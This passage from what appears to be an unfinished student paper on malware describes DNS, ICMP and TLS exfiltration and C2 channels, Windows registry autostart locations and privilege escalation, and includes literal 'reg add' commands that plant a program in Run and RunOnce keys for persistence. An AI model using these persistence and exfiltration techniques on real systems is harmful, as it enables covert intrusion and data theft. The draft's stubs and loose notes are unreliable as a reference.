contacted and a Diffie-Hellman key exchange is initiated (to establish short live keys), with this repeating for 3 hops to create a non attributable link to the destination. The IP header is wrapped inside an 'onion' that is peeled back at each node, to reveal information about how to reach the next.
The process is more involed than that in reality, but again, is out of scope for this paper. \citep{TorMalware}

TOR can cause problems for those who require some baseline of monitoring, whether than be a place of education or a workplace, to avoid policy and law violations. It often is used for criminal activity, with port scanning, 
C2 and exfiltration often being carried out over the darknet that TOR is often used to connect to. \citep{TorMalware}

%reference laws?

%might need to develop tor more, malware that uses it etc..?
%mention window size
\section{Protocol Payload Abuse}

\subsection{DNS}
Domain Name Service, commonly known as DNS is a protocol that servers to resolve domain names to their respective IP addresses (and vice versa). It acts as a way for humans to use the internet in a more intuative and
memorable way, as well as allowing for variability in infrastructure deployments. If a file share is given a domain name and port, that domain name can then be used in clients that it serves; if the IP that is resolved into changes,
then the client needs not change anything, and so less configuration is needed long term. Another point to make is that this allows for a round robin approach to load balancing where a given domain name resolves to different IP addresses providing the
same service which evens the workload. 

DNS is commonly used on most networks, as it provides an intregal part in most interaction, human and programs alike. The assumption that DNS would be on practically any network can be used in an adversarie's favour; DNS is not often monitored to the degree it should be.
DNS allows for fairly covert channels to transport data, that if done well, can bypass firewall and IDS/IPS systems. A C2 structure can be formed through this communication.

An abstract from a relevant paper \citep{DNSExfiltration}: 

\begin{displayquote}
\begin{textit}
"1: The attacker must have control of an authoritative DNS
server, which will be the end point for the DNS requests
transmitted from the victim.

2: Exfiltration tools consist of two component applications; the client on the victim machine, and the server
controlled by the attacker. The victim machine must
be infected with the client tool. For example, within a
malware payload.

3a: With control of the victim’s machine, the exfiltration
tool is used to encapsulate selected data from the victim
into DNS requests.

3b/c: The request is forwarded through DNS servers
until it reaches the attacker. This reflects standard DNS
operation i.e. if a server is unable to resolve the DNS
request, it forwards it to a higher-level DNS server.

4: Once the request reaches the authoritative DNS server,
the server side of the exfiltration tool strips the data from
the request and reconstructs it into the original format."
\end{textit}
\end{displayquote}

\vspace*{1in}


There are tools capable of conducting such an technique; these include:
\begin{enumerate}
    \item DnsCat2 - "This tool is designed to create an encrypted command-and-control (C&C) channel over the DNS protocol" \citep{dnscat2}
    \item DNSExfiltrator - "Allows for transfering a file over a DNS request covert channel." \citep{DNSExfiltrator}
    \item Iodine - "IP over DNS tunneling client" \citep{iodine}
    \item DET - "Data Exfiltration Toolkit" \citep{DET}
\end{enumerate}

There are multiple vectors in the DNS protocol to attach meaninful variance; 
The domain name itself that is attempted to be resolved, using common queries such as A or AAAA and tunneling other protocols 
through the data payload of the DNS query. Depending on the throughput needed, the requests can be segmented to be more covert, as tunneling 
SSH through DNS can be quite loud in respective to detection software. \citep{DNSExfiltration}

%good table for tools
%snort apparenlty has lists for certain kinds of malicous traffic, including thism, sometimes with regex (snort)
%rereference his sources?
%what is looked for, look at the paper...not done
%find a better  way to show quotation
%good mitigation on that paper
%try out tools

%I have a lot of notes I need to copy over

\subsection{ICMP}
ICMP is a control message protocol for IP that lets a host ping another host to validate connectivity. This relies on the other side allowing ICMP, and that it responds. that ICMP allows for a similar kind of exfiltration to DNS. Exfiltration methodologies can be split into two categories, timing and storage based. The former uses time as the boolean measure as to a given status by manipualtion responce/request time, for example delaying responce by 3 seconds if clear text passwords exist.
The latter relies on fields within the protocol having storage capacity for variable data for exfiltration. These tend to be unused or optional fields, with one process writing to them, and another stripping it out. The ICMP data payload inside the frame is the most obvious location, but it being under the ICMP banner, can help divert attention elsewhere. There are other less obvious places that data could be placed, but that is out of scope for this paper. \citep{ICMPExfiltration}

Ping can be leveraged to specify it's 16 byte ECHO\_REQUEST field's contents. The source states that a simple Scapy Python script can be used in combination with timing and payload switches of the ping utility, to exfiltrate data under the ICMP protocol. This relies on compression of data into hexadecimal, and to then sneak that into intervaled bytes that the listener/sniffer on the malicous server will then strip and write to a file. \citep{pingExfil}
%would be good to try out!



\subsection{TLS}
Transport Layer Security, and formally Secure Socket Layer (obselte since 1999 when TLS evolved from it) are protcols to encrypt data cryptographically in transit. It's use typically applies to client to server communication. It ensures that while transmitting through potentially insecure nodes of the internet, data is secured and non sensicle to those who potentially have a network tap to view transmission contents. This is extreamly important for communications that are sensitive in nature such as emails and voice communications. \citep{CloudflareTLS}

TLS is ultimately a layer for other protocols to plug into, to push their traffic through, with the other side agreeing to decrypt it in the same way. For example, there is HTTPS, HTTP over TLS. The cryptographic protocol must be agreed upon, as must the decryption key. This is done during the TLS handshake, except without an explicit key as that would be insecure to push over the network in clear text. \citep{CloudflareTLS}

PGP encryption is a popular choice for this, it provides an effective way of maintaining confidentiality and integrity. Each host has a private key only known to them, each also have a public key based on that private key given to anyone who wants it. This is known as asymmetric encryption. When data is asymmetric, private key encrypted data can only be decrypted by the public key of the other side, and vise versa.  

As noted, integrity can be assured with this method. This is especially important in two settings. The first being infrastructure validation, in which server A and B want to ensure they are talking to each other, and not an inpersonator whom wouldn't have the same public key. The second being the validation of websites, particually the ones of high traffic. Often these sites have to handle sensitive infoirmation, and so clearly there is a need for them to prove they are who they are. They use the TLS and PGP process to develop certificates that are given to the browser who then automatically check with certificate authorities (CAs) to ensure they are the real deal. Challenges are oftne given to the domain servers holding a given ceritifciate that only they can complete.

It is clear that TLS can be used for great purpose, to ensure data can be hidden from those it was not intended for, which helps prevent cyber crime known as man-in-the-middle attacks. A commonality in security is that both sides often use the same tools for different purposes. TLS unfortunalty can be used to encrypt C2 
channels to make them even more covert in transit. This is due to the flexibility of TLS, along with how computers handle data indiscriminately. Domains are cheap, and registering one for malicous purposes is common place in the criminal world. \citep{TLS}

%could talk deeper on the process
%reference exfiltration  by obfuscation - twiiter bot
%------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------%


\chapter{Malware Mechanisms - Persistence}
Important for malware to have continued access, even after a reboot. I will try a few of these with a reverse shell. 
We need triggers, these triggers should be fairly legit, with malformed payloads. These triggers should be automatic, or at least on something that would be done normally.

Windows works by leaving files for both reference, logs and to speed proccess up. These either are intrinsic to how the OS works or simply have been left behind. 
These are great for finding evidence and purpose. We can prove that the criminal acted at a given time, on a given file etc... These are some useful areas. This is windows 10, but older ones are still out there, 7 upwards are very similar. We need to be able to recreate.

\section{Registry Manipulation}
A hive that is normally maintained by the system. You can change values and implant whatever you want in there. Here are some strategic places. 
Many of these are ASEPs (AutoStart Extension Points), meaning they run without user interaction. The registry seems to have issues with wild wildcards, 
in that it will run essentially anything under a given hive at it's respective time and permissions. It's a rootkit waiting to happen. 
It's where forensic analysts will look first. When i'm testing this, I often use regedit.exe. Real malware wouldn't do this, it would do it via scripting. 
A few example of the reg command are below. 
//expand upon with real scripting.


\subparagraph{Startup Keys}
Keys that point to folders, that can launch shortcuts and executables as the given user, often during login or reboot
\begin{lstlisting}[label=RegistryStartupKeys,caption=Registry Startup Key Locations]
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders //will default to carl in my case
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders //for public
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders  //for users

Windows Startup folder - Anything here auto execs on startup, even shortcuts. run  ----> shell:startup

C:\Users\USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup //seems to run as logged in user - waits for login, rather than boot level

\end{lstlisting}

\subparagraph{Services}
Winload.exe is the first to load in the OS, reads the hive to see what drivers need to be loaded. It is responsible for the "starting windows" message.
\begin{lstlisting}[label=RegistryServices,caption=Registry Service Locations]
HKLM\SYSTEM\CurrentControlSet\Services

View drivers (Admin)
reg query hklm\system\currentcontrolset\services /s | findstr ImagePath 2>nul | findstr /Ri ".*\.sys\$"

C:\WINDOWS\TEMP\INSTB64.SYS C:\Users\USERNA~1\AppData\Local\Temp\cpuz135\cpuz135_x64.sys C:\Windows\TEMP\009947~1.EXE C:\Users\username\AppData\Local\Temp\ALSysIO64.sys
//Temp or user folders would be very sus! It's about looking for anomalous locations.s
\end{lstlisting}


\subparagraph{Browser Helper Objects}
\begin{lstlisting}[label=RegistryBHO,caption=Registry BHO Locations]
A DLL module that loads on internet explorer startup. It's reactionary, requires reasonable setup, but is fairly reliable. A favourite for data theft.
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects
\end{lstlisting}

\subparagraph{BootExecute Keys}
\begin{lstlisting}[label=RegistryBootExecute,caption=Registry BootExecute Locations]
HKLM\SYSTEM\CurrentControlSet\Control\hivelist
HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Control\Session Manager
\end{lstlisting}

As far as locations in the registry where malicious processes or modules can be configured to launch from, the BootExecute key is the earliest. 
Smss.exe will load any programs it finds listed here. By default the only entry in this string array is autocheck autochk * which runs Autochk during boot.
Decodes to "autocheck autochk * aHdqEPamx", loads this on boot. This is the view of an online sandbox analyzer.

\subparagraph{DLL Search Order Hijacking}
If a process is executed, it will look in it's own folder first, and use it's DLL, even over a windows one, to overwrite it. If not, it will read the location of root, 
to the destination with spaces, and means you can inject a dll where you know it will look before the real one. Even explorer.exe does this!

\subparagraph{AppInit\_DLLs}
Everytime User32.dll is loaded by an exe, this string is read and modules are loaded that are listed. This is invoked a fair few times on system loadup from multiple initilized processes.

\subparagraph{Run & RunOnce Keys}
\begin{lstlisting}[label=RegistryRun,caption=Registry Run Locations] 
User (For then priv esc):
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce

Admin Level:
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
//depending on architecture
HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce

reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v Pentestlab /t REG_SZ /d "C:\Users\pentestlab\pentestlab.exe"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Pentestlab /t REG_SZ /d "C:\Users\pentestlab\pentestlab.exe"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices" /v Pentestlab /t REG_SZ /d "C:\Users\pentestlab\pentestlab.exe"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v Pentestlab /t REG_SZ /d "C:\Users\pentestlab\pentestlab.exe"

\end{lstlisting}

\citep{registryRun}
%reference locations of registry info, evernote
%find where I got this stuff from

\section{Priviledge Escalation}
The idea behind privilege escalation is that under the assumption that a user shell is granted, that shell can then be leveraged in a malcious way to gain higher privilege.
Permissions are often exploited in order to escape user level contraints, often due to poor configuration. This varies from hijacking processes running as root (system in windows) to
abusing scheduled tasks to run user defined code. The ultimate goal of priv esc is to leverge the highest user shell, from there; system level persistance mechanisms such as rootkits can be easily
leveraged for deep persistance. 

\subsection{Command Injection}
We can use command injection to run any command that user has available. This may include netcat or any allowed system command. This could all be prevented with a few steps. 
Proper input validation on the entry point.Lack of access that the web application has to system commands, as well as up the date packages of the languages that have this vulnerable. There is no reason that netcat should be on a target system. 
The following is possible otherwise. We could use this attack in a input that runs a command, we end the command and run another as that user, in this case popping a shell for us to run commands more easily ourselves.

\subsection{Scheduler Manipulation}
Linux systems use cron, and windows systems use task scheduler. They both allow for administrators to automate tasks. The use case is usually for an on-boot task, or perodically ran for backups and other important jobs.
THey save the administrator from having to run it manually, leaving them to do other jobs. They are invaluable for backup hygiene, as well as autostarting important programs. While these schedulers can run single commands, 
they are often given scripts for which to run at their defined time. The programmer in this case does not have to worry about scheduling code, they let the OS sort it out with their defined settings. The script will do 'x'
task, and will run through it's defined algorithm. 

The problem arises in the permissions of the potentially variable file. The script will always run as the user chosen to run the task. This means that the script could be running as the system or root user without explicit knowledge, and as such
, if exploited could also run arbitrary code. A particually nasty attack vector is the write permission of the script. If not secured so that only system level permissions can edit it, potentially any user can alter it.
A user account could be hijacked, and then attempt to write to a scheduled script file. The user writing to the file may not be the one running it periodically, and as such any changes could be ran as the system/root user.


\subsection{SUID Manipulation}
%gtfobins
%sudo -l

\subsection{User Account Creation}
\section{Process Hijacking}
%dunno about this stuff

\section{Symbolic Locations}
%urandom - maybe
%/dev/shm
%/dev/udp - think thats it?

%------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------%

%to slot somewhere else
%multihoming, defence in depth, dmz, airgapping
%fix chapters for mechanisms
%hash cracking / pass the hash? Hash cracking only really works for small data or passwords
%network snooping & tapping
%xss web sockets fake page card skimmer 
%split into chapters?
%priv esc sripts abd what they look for in detail, each part
%consider empty sections and subsections that only host children

%sections to do:
%malware examples
%priv esc techniques
%buffer overflows

%look at other notes